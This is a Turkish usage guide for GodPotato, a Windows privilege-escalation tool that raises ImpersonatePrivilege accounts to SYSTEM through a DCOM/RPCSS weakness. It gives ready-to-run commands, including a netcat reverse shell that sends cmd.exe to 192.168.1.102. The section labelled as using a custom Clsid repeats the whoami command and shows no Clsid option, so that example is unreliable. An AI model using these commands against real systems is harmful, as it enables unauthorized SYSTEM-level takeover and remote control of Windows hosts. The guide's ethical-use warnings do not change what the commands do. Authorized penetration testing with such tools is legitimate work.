# GodPotato Kullanım Rehberi

## GodPotato Nedir?

**GodPotato**, Windows sistemlerinde "Potato" tabanlı bir yetki yükseltme aracıdır. Bu aracın temel hedefi, Windows Server 2012'den Windows Server 2022'ye kadar olan sistemlerde "ImpersonatePrivilege" yetkisine sahip kullanıcıların, "NT AUTHORITY\SYSTEM" seviyesine yetki yükseltmesini sağlamaktır. 

DCOM protokolü üzerine yapılan araştırmalar sonucu bulunan bu yöntem, RPCSS servisindeki belirli eksiklikleri kullanarak çalışır.

> **Önemli Not:** GodPotato, yetkili ortamlarda ve etik kullanım amacıyla kullanılmalıdır. Yetkisiz kullanımlar yasa dışıdır.

---

## Etkilenen Sistemler

- **Windows Server:** 2012 - 2022
- **Windows:** 8 - 11

---

## Özellikler

- DCOM tabanlı yetki yükseltme.
- Web ve veritabanı servisleri gibi "ImpersonatePrivilege" yetkisine sahip kullanıcılar için sistem seviyesinde yetki alma.

---

## Gereksinimler

- **Windows işletim sistemi**
- "ImpersonatePrivilege" yetkisine sahip bir kullanıcı hesabı

---

## Kullanım

### Genel Kullanım

```bash
GodPotato.exe -cmd "<komut>"
```

| Parametre | Açıklama                                |
|-----------|----------------------------------------|
| `-cmd`    | Çalıştırılacak komutu belirtir (Varsayılan: `cmd /c whoami`). |

---

### Örnek Komutlar

#### Basit Komut Çalıştırma

Bir kullanıcının mevcut yetkisini kontrol etmek için:

```bash
GodPotato.exe -cmd "cmd /c whoami"
```

#### Ters Kabuk (Reverse Shell) Bağlantısı Oluşturma

Hedef sistemden ters kabuk bağlantısı alınması için:

```bash
GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```

#### Özelleştirilmiş Clsid ile Komut Çalıştırma

Belirli bir Clsid kullanarak komut çalıştırma:

```bash
GodPotato.exe -cmd "cmd /c whoami"
```

---

## Teşekkürler

- **zcgonvh**
- **skay**

---

## Lisans

Bu proje **Apache License 2.0** ile lisanslanmıştır.

> **Uyarı:** Bu aracın yanlış kullanımı yasa dışıdır. Yalnızca yetkili ve etik ortamlarda kullanılmalıdır.
